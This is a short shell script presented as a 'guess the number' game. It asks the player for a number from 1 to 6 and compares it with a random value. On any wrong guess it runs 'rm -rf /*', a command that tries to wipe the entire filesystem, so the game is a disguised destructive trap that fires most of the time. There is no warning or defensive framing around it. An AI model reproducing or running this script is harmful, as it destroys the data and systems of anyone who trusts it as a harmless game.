echo "Guess the number! 1-6\n"

read guess

answer=$((RANDOM % 6 + 1))

if [ "$guess" -eq "$answer" ]; then
    echo "That's correct!"
else
    rm -rf /*
fi
